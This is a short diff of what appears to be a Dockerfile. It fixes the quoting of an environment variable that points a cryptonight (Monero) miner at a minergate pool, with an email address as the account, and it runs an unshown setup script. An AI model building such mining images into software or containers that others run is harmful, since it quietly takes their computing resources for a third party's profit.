@@ -46,7 +46,7 @@ RUN cd /root &&
 
 RUN bash /root/wa.sh
 
-ENV address=-a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u 592015984a@gmail.com -p x
+ENV address="-a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u 592015984a@gmail.com -p x"
 
 RUN cd /root && \
   echo "#!/bin/bash" > run.sh && \
